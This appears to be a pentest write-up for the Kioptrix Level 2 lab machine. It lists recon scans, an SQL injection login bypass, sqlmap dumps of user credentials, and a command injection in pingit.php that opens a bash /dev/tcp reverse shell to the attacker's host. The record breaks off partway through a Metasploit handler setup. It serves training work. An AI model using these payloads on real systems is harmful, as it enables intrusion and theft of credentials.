# level 2

| Proto | port    | Service/URL                         | Info                                     | Potential Vulns | Verified Vulns |
|-------|---------|-------------------------------------|------------------------------------------|-----------------|----------------|
|       |         | system                              | CentOS 4.5 Linux 2.6.9-55.EL i686        | ['ip_append_data()' Ring0 Privilege Escalation (1)](https://www.exploit-db.com/exploits/9542) <br> ['sock_sendpage()' Local Privilege Escalation](https://www.exploit-db.com/exploits/9545) | 'sock_sendpage()' |
| TCP   | 22      | SSH                                 | OpenSSH 3.9p1 (protocol 1.99) <br>       |                 |                |
| TCP   | 80,443  | HTTP/S                              | Apache httpd 2.0.52 (EOL)  <br> no secuirty headers <br> Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br> CentOS 4.5 Linux 2.6.9-55.EL i686
 <br> PHP/4.3.9 (EOL) <br> [PHP Credits file](http://192.168.88.130/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000)  | [SSLVerifyClient bypass](https://www.rapid7.com/db/vulnerabilities/apache-httpd-cve-2005-2700) <br> [PHP < 4.5.0 - Unserialize Overflow](https://www.exploit-db.com/exploits/9939) | |
| TCP   | 80,443  | http://192.168.88.130/index.php     | | SQL Injection     | `admin ' OR ' 1'='1` |
| TCP   | 80,443  | http://192.168.88.130/pingit.php    | | Command Injection | ip=8.8.8.8;bash -i >& /dev/tcp/192.168.88.128/4444 0>&1&submit=submit |
| TCP   | 111     | RPC bind                            | | | |
| TCP   | 620     | status RPC                          | | | |
| TCP   | 631     | IPP                                 | CUPS 1.1 <br> Allowed HTTP Methods: GET, HEAD, OPTIONS, POST, PUT | ['.HPGL' File Processor Buffer Overflow](https://www.exploit-db.com/exploits/24977) [CUPS 1.1.x - Negative Length HTTP Header ](https://www.exploit-db.com/exploits/22106) | |
| TCP   | 3306    | MySQL                               | MySQL <br> IP filtered | |
| UDP   | 111     | RPCbind                             | | |

## Enum

### Find IP

```bash
nmap -n -sn -PR 192.168.88.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 20:32 CET
Nmap scan report for 192.168.88.2
Host is up (0.00042s latency).
MAC Address: 00:50:56:FE:4E:C1 (VMware)
Nmap scan report for 192.168.88.130
Host is up (0.00099s latency).
MAC Address: 00:0C:29:D7:71:4E (VMware)
Nmap scan report for 192.168.88.254
Host is up (0.0028s latency).
MAC Address: 00:50:56:F7:8F:D0 (VMware)
Nmap scan report for 192.168.88.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.17 seconds
```

### TCP

```bash
nmap -T4 -p- -A 192.168.88.130 -oA tcp
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 20:34 CET
Nmap scan report for 192.168.88.130
Host is up (0.00060s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
|_ssl-date: 2020-01-02T17:25:48+00:00; -2h09m46s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
620/tcp  open  status     1 (RPC #100024)
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql      MySQL (unauthorized)
MAC Address: 00:0C:29:D7:71:4E (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: -2h09m46s

TRACEROUTE
HOP RTT     ADDRESS
1   0.60 ms 192.168.88.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/
submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.32 seconds
```

### UDP

```bash
nmap -sU -T4 192.168.88.130 -oA udp 
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 21:12 CET
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.40% done; ETC: 21:13 (0:01:10 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.73% done; ETC: 21:14 (0:01:53 remaining)
Stats: 0:15:05 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 93.13% done; ETC: 21:28 (0:01:07 remaining)
Nmap scan report for 192.168.88.130
Host is up (0.00068s latency).
Not shown: 957 closed ports, 42 open|filtered ports
PORT    STATE SERVICE
111/udp open  rpcbind
MAC Address: 00:0C:29:D7:71:4E (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1029.23 seconds
```

### 192.168.88.130 80/443

#### Nikto

```bash
nikto -h 192.168.88.130
```

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.88.130
+ Target Hostname:    192.168.88.130
+ Target Port:        80
+ Start Time:         2020-01-02 20:35:53 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 19:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 1 error(s) and 17 item(s) reported on remote host
+ End Time:           2020-01-02 20:36:46 (GMT1) (53 seconds)
---------------------------------------------------------------------------
```

#### gobuster

```bash
./go/bin/gobuster dir -u http://192.168.88.130 -w /usr/share/wordlists/dirb/common.txt -t 40 -e
```

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.88.130
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/02 20:50:44 Starting gobuster
===============================================================
http://192.168.88.130/.htpasswd (Status: 403)
http://192.168.88.130/.htaccess (Status: 403)
http://192.168.88.130/.hta (Status: 403)
http://192.168.88.130/cgi-bin/ (Status: 403)
http://192.168.88.130/index.php (Status: 200)
http://192.168.88.130/manual (Status: 301)
http://192.168.88.130/usage (Status: 403)
===============================================================
2020/01/02 20:50:45 Finished
===============================================================
```

```bash
./go/bin/gobuster dir -u 192.168.88.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -e
```

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.88.130
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/02 20:52:04 Starting gobuster
===============================================================
http://192.168.88.130/index.php (Status: 200)
http://192.168.88.130/manual (Status: 301)
http://192.168.88.130/usage (Status: 403)
===============================================================
2020/01/02 20:54:29 Finished
===============================================================
```

#### SQL Injection

```bash
username: admin ' OR ' 1'='1
password: admin ' OR ' 1'='1
``` 

```txt
POST /index.php HTTP/1.1
Host: 192.168.88.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.88.130/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Connection: close
Upgrade-Insecure-Requests: 1

uname=admin&psw=admin&btnLogin=Login
``` 

```bash
sqlmap -r request.txt -p psw --dbms mysql --level=5 --risk=3 --dump-all
```

```bash
        ___                                                                                                                                                                              
       __H__                                                                                                                                                                             
 ___ ___[)]_____ ___ ___  {1.3.12#stable}                                                                                                                                                
|_ -| . [(]     | .'| . |                                                                                                                                                                
|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                
      |_|V...       |_|   http://sqlmap.org                                                                                                                                              
                                                                                                                                                                                         
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal 
laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                             
                                                                                                                                                                                         
[*] starting @ 22:16:43 /2020-01-02/                                                                                                                                                     
                                                                                                                                                                                         
[22:16:43] [INFO] parsing HTTP request from 'request.txt'                                                                                                                                
[22:16:43] [INFO] testing connection to the target URL                                                                                                                                   
[22:16:43] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                                                            
[22:16:43] [INFO] testing if the target URL content is stable                                                                                                                            
[22:16:43] [INFO] target URL content is stable                                                                                                                                           
[22:16:43] [WARNING] heuristic (basic) test shows that POST parameter 'psw' might not be injectable                                                                                      
[22:16:44] [INFO] testing for SQL injection on POST parameter 'psw'                                                                                                                      
[22:16:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                                                                                                             
[22:16:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'                                                                                                              
[22:16:44] [INFO] POST parameter 'psw' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="Web")                                                  
[22:16:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                  
[22:16:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                                                       
[22:16:44] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                                              
[22:16:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                                                   
[22:16:44] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                                                      
[22:16:44] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                                                           
[22:16:44] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                            
[22:16:44] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                             
[22:16:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                     
[22:16:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                      
[22:16:44] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                        
[22:16:44] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                                         
[22:16:44] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                                            
[22:16:44] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                                                 
[22:16:44] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                                                        
[22:16:44] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                                                  
[22:16:44] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[22:16:44] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'                                                                                                           
[22:16:44] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[22:16:44] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[22:16:44] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[22:16:44] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[22:16:44] [INFO] testing 'MySQL inline queries'        
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'         
[22:16:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[22:16:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'                                                                                                       
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[22:16:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'                                                                                                  
[22:16:44] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'                                                                                                            
[22:17:04] [INFO] POST parameter 'psw' appears to be 'MySQL < 5.0.12 AND time-based blind (heavy query)' injectable       
[22:17:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:17:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:17:04] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[22:17:05] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'                                                                                              [38/1863]
[22:17:05] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[22:17:05] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[22:17:05] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[22:17:05] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[22:17:05] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[22:17:05] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[22:17:05] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[22:17:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[22:17:07] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[22:17:07] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
[22:17:07] [INFO] checking if the injection point on POST parameter 'psw' is a false positive
POST parameter 'psw' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 552 HTTP(s) requests:
---
Parameter: psw (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin&psw=-3012' OR 8578=8578-- aTyJ&btnLogin=Login

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
    Payload: uname=admin&psw=admin' AND 5240=BENCHMARK(5000000,MD5(0x63415659))-- YhHX&btnLogin=Login
---
[22:17:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL < 5.0.12
[22:17:19] [INFO] sqlmap will dump entries of all tables from all databases now
[22:17:19] [INFO] fetching database names
[22:17:19] [INFO] fetching number of databases
[22:17:19] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:17:19] [INFO] retrieved: 
[22:17:19] [INFO] retrieved: 
[22:17:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[22:17:19] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[22:17:19] [ERROR] unable to retrieve the number of databases
[22:17:19] [INFO] falling back to current database
[22:17:19] [INFO] fetching current database
[22:17:19] [INFO] retrieved: webapp
[22:17:19] [INFO] fetching tables for database: 'webapp'
[22:17:19] [INFO] fetching number of tables for database 'webapp'
[22:17:19] [INFO] retrieved: 
[22:17:19] [INFO] retrieved: 
[22:17:19] [WARNING] unable to retrieve the number of tables for database 'webapp'
[22:17:19] [ERROR] unable to retrieve the table names for any database
do you want to use common table existence check? [y/N/q] y
which common tables (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-tables.txt' (press Enter)
[2] custom
> 1
[22:17:22] [INFO] performing table existence using items from '/usr/share/sqlmap/data/txt/common-tables.txt'
[22:17:22] [INFO] adding words used on web page to the check list
[22:17:24] [WARNING] running in a single-thread mode. This could take a while
[22:17:24] [INFO] retrieved: users                                                                                                                                                       
                                                                                                                                                                                         
[22:17:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[22:17:43] [INFO] fetching current database
[22:17:43] [INFO] fetching columns for table 'users' in database 'webapp'
[22:17:43] [INFO] retrieved: 
[22:17:43] [INFO] retrieved: 
[22:17:43] [ERROR] unable to retrieve the number of columns for table 'users' in database 'webapp'
[22:17:43] [WARNING] unable to retrieve column names for table 'users' in database 'webapp'
do you want to use common column existence check? [y/N/q] y
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 1
[22:17:50] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt'
[22:17:50] [INFO] adding words used on web page to the check list
[22:17:52] [WARNING] running in a single-thread mode. This could take a while
[22:17:52] [INFO] retrieved: id                                                                                                                                                          
[22:17:52] [INFO] retrieved: username                                                                                                                                                    
[22:17:53] [INFO] retrieved: password                                                                                                                                                    
[22:18:06] [INFO] retrieved: password                                                                                                                                                    
[22:18:06] [INFO] retrieved: username                                                                                                                                                    
                                                                                                                                                                                         
[22:18:06] [INFO] fetching entries for table 'users' in database 'webapp'
[22:18:06] [INFO] fetching number of entries for table 'users' in database 'webapp'
[22:18:06] [INFO] retrieved: 2
[22:18:06] [INFO] retrieved: 1
[22:18:06] [INFO] retrieved: 5afac8d85f
[22:18:06] [INFO] retrieved: admin
[22:18:07] [INFO] retrieved: 2
[22:18:07] [INFO] retrieved: 66lajGGbla
[22:18:07] [INFO] retrieved: john
Database: webapp
Table: users
[2 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | 5afac8d85f | admin    |
| 2  | 66lajGGbla | john     |
+----+------------+----------+

[22:18:07] [INFO] table 'webapp.users' dumped to CSV file '/root/.sqlmap/output/192.168.88.130/dump/webapp/users.csv'
[22:18:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.88.130'

[*] ending @ 22:18:07 /2020-01-02/
```

```bash
sqlmap -r request.txt --os-shell
```

```bash
                                                                                     
        ___                                                                                                                                                                              
       __H__                                                                                                                                                                             
 ___ ___[,]_____ ___ ___  {1.3.12#stable}                                                                                                                                                
|_ -| . ["]     | .'| . |                                                                                                                                                                
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                
      |_|V...       |_|   http://sqlmap.org                                                                                                                                              
                                                                                                                                                                                         
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal 
laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                             
                                                                                                                                                                                         
[*] starting @ 22:20:04 /2020-01-02/                                                                                                                                                     
                                                                                                                                                                                         
[22:20:04] [INFO] parsing HTTP request from 'request.txt'                                                                                                                                
[22:20:04] [INFO] resuming back-end DBMS 'mysql'                                                                                                                                         
[22:20:04] [INFO] testing connection to the target URL                                                                                                                                   
sqlmap resumed the following injection point(s) from stored session:                                                                                                                     
---                                                                                                                                                                                      
Parameter: psw (POST)                                                                                                                                                                    
    Type: boolean-based blind                                                                                                                                                            
    Title: OR boolean-based blind - WHERE or HAVING clause                                                                                                                               
    Payload: uname=admin&psw=-3012' OR 8578=8578-- aTyJ&btnLogin=Login                                                                                                                   
                                                                                                                                                                                         
    Type: time-based blind                                                                                                                                                               
    Title: MySQL < 5.0.12 AND time-based blind (heavy query)                                                                                                                             
    Payload: uname=admin&psw=admin' AND 5240=BENCHMARK(5000000,MD5(0x63415659))-- YhHX&btnLogin=Login                                                                                    
---                                                                                                                                                                                      
[22:20:04] [INFO] the back-end DBMS is MySQL                                                                                                                                             
back-end DBMS: MySQL < 5.0.12                                                                                                                                                            
[22:20:04] [INFO] going to use a web backdoor for command prompt                                                                                                                         
[22:20:04] [INFO] fingerprinting the back-end DBMS operating system                                                                                                                      
[22:20:04] [INFO] the back-end DBMS operating system is Linux                                                                                                                            
which web application language does the web server support?                                                                                                                              
[1] ASP                                                                                                                                                                                  
[2] ASPX                                                                                                                                                                                 
[3] JSP                                                                                                                                                                                  
[4] PHP (default)                                                                                                                                                                        
> 4                                                                                                                                                                                      
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y                                                                                                           
[22:20:10] [WARNING] unable to automatically retrieve the web server document root                                                                                                       
what do you want to use for writable directory?                                                                                                                                          
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (defau
lt)                                                                                                                                                                                      
[2] custom location(s)                                                                                                                                                                   
[3] custom directory list file                                                                                                                                                           
[4] brute force search                                                                                                                                                                   
4                                                                                                                                                                                        
[22:20:20] [INFO] using generated directory list: /var/www,/var/www/html,/var/www/htdocs,/var/www/httpdocs,/var/www/php,/var/www/public,/var/www/src,/var/www/site,/var/www/build,/var/ww
w/web,/var/www/data,/var/www/sites/all,/var/www/www/build,/usr/local/apache,/usr/local/apache/html,/usr/local/apache/htdocs,/usr/local/apache/httpdocs,/usr/local/apache/php,/usr/local/a
pache/public,/usr/local/apache/src,/usr/local/apache/site,/usr/local/apache/build,/usr/local/apache/web,/usr/local/apache/www,/usr/local/apache/data,/usr/local/apache/sites/all,/usr/loc
al/apache/www/build,/usr/local/apache2,/usr/local/apache2/html,/usr/local/apache2/htdocs,/usr/local/apache2/httpdocs,/usr/local/apache2/php,/usr/local/apache2/public,/usr/local/apache2/
src,/usr/local/apache2/site,/usr/local/apache2/build,/usr/local/apache2/web,/usr/local/apache2/www,/usr/local/apache2/data,/usr/local/apache2/sites/all,/usr/local/apache2/www/build,/usr
/local/www/apache22,/usr/local/www/apache22/html,/usr/local/www/apache22/htdocs,/usr/local/www/apache22/httpdocs,/usr/local/www/apache22/php,/usr/local/www/apache22/public,/usr/local/ww
w/apache22/src,/usr/local/www/apache22/site,/usr/local/www/apache22/build,/usr/local/www/apache22/web,/usr/local/www/apache22/www,/usr/local/www/apache22/data,/usr/local/www/apache22/si
tes/all,/usr/local/www/apache22/www/build,/usr/local/www/apache24,/usr/local/www/apache24/html,/usr/local/www/apache24/htdocs,/usr/local/www/apache24/httpdocs,/usr/local/www/apache24/ph
p,/usr/local/www/apache24/public,/usr/local/www/apache24/src,/usr/local/www/apache24/site,/usr/local/www/apache24/build,/usr/local/www/apache24/web,/usr/local/www/apache24/www,/usr/loca
l/www/apache24/data,/usr/local/www/apache24/sites/all,/usr/local/www/apache24/www/build,/usr/local/httpd,/usr/local/httpd/html,/usr/local/httpd/htdocs,/usr/local/httpd/httpdocs,/usr/loc
al/httpd/php,/usr/local/httpd/public,/usr/local/httpd/src,/usr/local/httpd/site,/usr/local/httpd/build,/usr/local/httpd/web,/usr/local/httpd/www,/usr/local/httpd/data,/usr/local/httpd/s
ites/all,/usr/local/httpd/www/build,/var/www/nginx-default,/var/www/nginx-default/html,/var/www/nginx-default/htdocs,/var/www/nginx-default/httpdocs,/var/www/nginx-default/php,/var/www/
nginx-default/public,/var/www/nginx-default/src,/var/www/nginx-default/site,/var/www/nginx-default/build,/var/www/nginx-default/web,/var/www/nginx-default/www,/var/www/nginx-default/dat
a,/var/www/nginx-default/sites/all,/var/www/nginx-default/www/build,/srv/www,/srv/www/html,/srv/www/htdocs,/srv/www/httpdocs,/srv/www/php,/srv/www/public,/srv/www/src,/srv/www/site,/srv
/www/build,/srv/www/web,/srv/www/data,/srv/www/sites/all,/srv/www/www/build 

....

[22:20:28] [WARNING] unable to upload the file stager on '/'
[22:20:28] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 562 times
```

#### Command Injection in pingit.php

##### ls

```
request:
POST /pingit.php HTTP/1.1
Host: 192.168.88.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.88.130/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Connection: close
Upgrade-Insecure-Requests: 1

ip=8.8.8.8%3B+ls&submit=submit


Response:
HTTP/1.1 200 OK
Date: Thu, 02 Jan 2020 19:14:28 GMT
Server: Apache/2.0.52 (CentOS)
X-Powered-By: PHP/4.3.9
Content-Length: 407
Connection: close
Content-Type: text/html; charset=UTF-8

8.8.8.8; ls<pre>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=0 ttl=128 time=4.95 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=5.41 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=128 time=4.45 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 4.458/4.940/5.412/0.397 ms, pipe 2
index.php
pingit.php
</pre>
```

##### reverse shell

```bash
POST /pingit.php HTTP/1.1
Host: 192.168.88.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.88.130/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 75
Connection: close
Upgrade-Insecure-Requests: 1

ip=8.8.8.8%3bbash+-i+>%26+/dev/tcp/192.168.88.128/4444+0>%261&submit=submit


nc -lvp 4444
listening on [any] 4444 ...
192.168.88.130: inverse host lookup failed: Unknown host
connect to [192.168.88.128] from (UNKNOWN) [192.168.88.130] 35518
bash: no job control in this shell
bash-3.00$ whoami
apache
bash-3.00$ hostname
kioptrix.level2
bash-3.00$
```

#### meterpreter

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set LHOST 192.168.88.128
LHOST => 192.168.88.128
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set PAYLOAD linux/x86/shell/reverse_tcp
